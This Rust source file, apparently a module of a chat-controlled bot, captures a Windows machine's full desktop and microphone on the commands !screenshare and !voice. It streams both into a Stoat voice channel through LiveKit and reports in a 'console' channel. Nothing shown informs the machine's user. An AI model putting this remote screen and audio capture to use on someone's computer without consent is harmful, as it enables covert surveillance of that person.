// language: Rust, file: src/voice.rs, target: Windows
// Stoat voice integration via LiveKit: join a voice channel and publish tracks.
//   !screenshare  -> publishes the screen as a video track
//   !voice        -> publishes the microphone as an audio track
#![cfg(windows)]
#![allow(dead_code)]
use anyhow::{bail, Context, Result};
use std::sync::atomic::{AtomicBool, Ordering};

use livekit::options::TrackPublishOptions;
use livekit::prelude::*;
use livekit::webrtc::audio_frame::AudioFrame;
use livekit::webrtc::audio_source::native::NativeAudioSource;
use livekit::webrtc::audio_source::{AudioSourceOptions, RtcAudioSource};
use livekit::webrtc::video_frame::{I420Buffer, VideoFrame, VideoRotation};
use livekit::webrtc::video_source::native::NativeVideoSource;
use livekit::webrtc::video_source::{RtcVideoSource, VideoResolution};

use cpal::traits::StreamTrait;

use crate::config::Config;
use crate::stoat::Stoat;
use crate::workspace::Workspace;

pub static STOP: AtomicBool = AtomicBool::new(false);
/// One live voice session at a time — a second join must never nuke the running room.
pub static ACTIVE: AtomicBool = AtomicBool::new(false);

/// Ask Stoat for a LiveKit token for a voice channel. A voice channel that has never
/// been joined has no node assigned, so the request must name one.
async fn request_token(st: &Stoat, channel: &str) -> Result<(String, String)> {
    let node = st
        .get_json("/")
        .await
        .ok()
        .and_then(|root| root["features"]["livekit"]["nodes"][0]["name"].as_str().map(String::from));
    let body = match node {
        Some(n) => serde_json::json!({ "node": n }),
        None => serde_json::json!({}),
    };
    let v = st
        .post_json(&format!("/channels/{channel}/join_call"), body)
        .await?;
    let token = v["token"].as_str().context("no token in join_call")?.to_string();
    let url = v["url"].as_str().context("no url in join_call")?.to_string();
    Ok((token, url))
}

/// Join voice robustly. Stoat tracks a bot's voice state per channel, so an earlier
/// failed attempt can leave us "already connected" to that channel. Deleting the channel
/// clears the state server-side, so we recreate it and retry.
pub async fn join_voice(st: &Stoat, ws: &Workspace) -> Result<(String, String, String)> {
    let channel = ensure_voice_channel(st, ws).await?;
    // Any failure on this channel (AlreadyConnected, a stale room, or an SFU hiccup) — fall
    // through and rebuild the channel, which gets us a brand-new LiveKit room.
    match request_token(st, &channel).await {
        Ok((t, u)) => return Ok((t, u, channel)),
        Err(_) => {}
    }
    // stale state — wipe the channel (clears it) and try a fresh one
    let _ = st.delete_channel(&channel).await;
    let fresh = st
        .create_channel(&ws.server, serde_json::json!({ "type": "Voice", "name": "voice" }))
        .await?;
    let fresh_id = fresh["_id"].as_str().context("no channel id")?.to_string();
    match request_token(st, &fresh_id).await {
        Ok((t, u)) => Ok((t, u, fresh_id)),
        Err(_) => {
            // last resort: a uniquely named channel is guaranteed a clean state entry
            let uniq = format!("voice-{}", chrono::Local::now().format("%H%M%S"));
            let c = st
                .create_channel(&ws.server, serde_json::json!({ "type": "Voice", "name": uniq }))
                .await?;
            let id = c["_id"].as_str().context("no channel id")?.to_string();
            let (t, u) = request_token(st, &id).await?;
            Ok((t, u, id))
        }
    }
}

/// Find (or create) the voice channel used for streams.
pub async fn ensure_voice_channel(st: &Stoat, ws: &Workspace) -> Result<String> {
    if let Some(id) = crate::workspace::find_channel_by_name(st, &ws.server, "voice").await? {
        return Ok(id);
    }
    let v = st
        .create_channel(&ws.server, serde_json::json!({ "type": "Voice", "name": "voice" }))
        .await?;
    Ok(v["_id"].as_str().context("no channel id")?.to_string())
}

/// Publish the screen as a video track and stream frames until STOP.
pub async fn screenshare(st: &Stoat, cfg: &Config, ws: &Workspace) -> Result<String> {
    if ACTIVE.swap(true, Ordering::SeqCst) {
        bail!("already streaming — send `!vc stop` first");
    }
    let r = screenshare_inner(st, cfg, ws).await;
    ACTIVE.store(false, Ordering::SeqCst);
    r
}

async fn screenshare_inner(st: &Stoat, _cfg: &Config, ws: &Workspace) -> Result<String> {
    STOP.store(false, Ordering::SeqCst);
    let (token, url, channel) = join_voice(st, ws).await?;
    let (room, mut events) = Room::connect(&url, &token, RoomOptions::default())
        .await
        .context("livekit connect")?;
    // MUST keep the event receiver alive — dropping it tears the room down. Log events so
    // a disconnect tells us why.
    tokio::spawn(async move {
        while let Some(ev) = events.recv().await {
            eprintln!("[voice] {ev:?}");
        }
    });

    let (_, w, h) = crate::capture::virtual_desktop_rgba()?;
    let source = NativeVideoSource::new(VideoResolution { width: w, height: h }, true);
    let track = LocalVideoTrack::create_video_track("screen", RtcVideoSource::Native(source.clone()));
    let opts = TrackPublishOptions {
        source: TrackSource::Screenshare,
        ..Default::default()
    };
    room.local_participant()
        .publish_track(LocalTrack::Video(track), opts)
        .await?;
    let _ = st
        .send(
            &ws.channels.console,
            &format!("screenshare live — join the voice channel ({channel}) to watch"),
        )
        .await;

    while !STOP.load(Ordering::SeqCst) {
        // Capture + convert OFF the async runtime: this work is blocking and would
        // otherwise starve the room's keepalive and get us disconnected.
        let src = source.clone();
        let _ = tokio::task::spawn_blocking(move || {
            if let Ok((raw, w2, h2)) = crate::capture::virtual_desktop_rgba() {
                let mut buf = I420Buffer::new(w2, h2);
                rgba_to_i420(&raw, w2, h2, &mut buf);
                let frame = VideoFrame::new(VideoRotation::VideoRotation0, buf);
                src.capture_frame(&frame);
            }
        })
        .await;
        tokio::time::sleep(std::time::Duration::from_millis(80)).await; // ~12 fps
    }
    let _ = room.close().await;
    Ok(channel)
}

/// Publish the microphone as an audio track until STOP.
pub async fn voice_mic(st: &Stoat, cfg: &Config, ws: &Workspace) -> Result<String> {
    if ACTIVE.swap(true, Ordering::SeqCst) {
        bail!("already streaming — send `!vc stop` first");
    }
    let r = voice_mic_inner(st, cfg, ws).await;
    ACTIVE.store(false, Ordering::SeqCst);
    r
}

async fn voice_mic_inner(st: &Stoat, _cfg: &Config, ws: &Workspace) -> Result<String> {
    STOP.store(false, Ordering::SeqCst);
    let (token, url, channel) = join_voice(st, ws).await?;
    let (room, mut events) = Room::connect(&url, &token, RoomOptions::default())
        .await
        .context("livekit connect")?;
    // MUST keep the event receiver alive — dropping it tears the room down. Log events so
    // a disconnect tells us why.
    tokio::spawn(async move {
        while let Some(ev) = events.recv().await {
            eprintln!("[voice] {ev:?}");
        }
    });

    let rate = 48_000u32;
    let source = NativeAudioSource::new(AudioSourceOptions::default(), rate, 1, 100);
    let track = LocalAudioTrack::create_audio_track("mic", RtcAudioSource::Native(source.clone()));
    let opts = TrackPublishOptions {
        source: TrackSource::Microphone,
        ..Default::default()
    };
    room.local_participant()
        .publish_track(LocalTrack::Audio(track), opts)
        .await?;
    let _ = st
        .send(
            &ws.channels.console,
            &format!("mic live — join the voice channel ({channel}) to listen"),
        )
        .await;

    // cpal capture into a shared buffer. The Stream is !Send, so it lives entirely inside
    // a blocking task; the async loop only drains samples and pushes frames.
    let buf: std::sync::Arc<std::sync::Mutex<Vec<i16>>> =
        std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let buf_cap = buf.clone();
    tokio::task::spawn_blocking(move || {
        if let Ok(stream) = crate::capture::start_mic_stream(buf_cap, rate) {
            let _ = stream.play();
            while !STOP.load(Ordering::SeqCst) {
                std::thread::sleep(std::time::Duration::from_millis(100));
            }
            drop(stream);
        }
    });

    let per_frame = (rate / 100) as usize; // 10 ms, mono
    while !STOP.load(Ordering::SeqCst) {
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        let chunk: Vec<i16> = {
            let mut g = buf.lock().unwrap();
            if g.len() < per_frame {
                continue;
            }
            g.drain(..per_frame).collect()
        };
        let mut frame = AudioFrame::new(rate, 1, per_frame as u32);
        {
            let data = frame.data.to_mut();
            for (i, s) in chunk.iter().enumerate() {
                data[i] = *s;
            }
        }
        let _ = source.capture_frame(&frame).await;
    }
    let _ = room.close().await;
    Ok(channel)
}

/// BT.601 RGBA -> I420.
fn rgba_to_i420(rgba: &[u8], w: u32, h: u32, buf: &mut I420Buffer) {
    let (cw, ch) = ((w + 1) / 2, (h + 1) / 2);
    let (dy, du, dv) = buf.data_mut();
    for y in 0..h as usize {
        for x in 0..w as usize {
            let i = (y * w as usize + x) * 4;
            if i + 2 >= rgba.len() {
                continue;
            }
            let (r, g, b) = (rgba[i] as f32, rgba[i + 1] as f32, rgba[i + 2] as f32);
            let yy = (0.299 * r + 0.587 * g + 0.114 * b).clamp(0.0, 255.0) as u8;
            dy[y * w as usize + x] = yy;
        }
    }
    for y in 0..ch as usize {
        for x in 0..cw as usize {
            let i = ((y * 2) * w as usize + x * 2) * 4;
            if i + 2 >= rgba.len() {
                continue;
            }
            let (r, g, b) = (rgba[i] as f32, rgba[i + 1] as f32, rgba[i + 2] as f32);
            let u = (-0.169 * r - 0.331 * g + 0.500 * b + 128.0).clamp(0.0, 255.0) as u8;
            let v = (0.500 * r - 0.419 * g - 0.081 * b + 128.0).clamp(0.0, 255.0) as u8;
            du[y * cw as usize + x] = u;
            dv[y * cw as usize + x] = v;
        }
    }
}
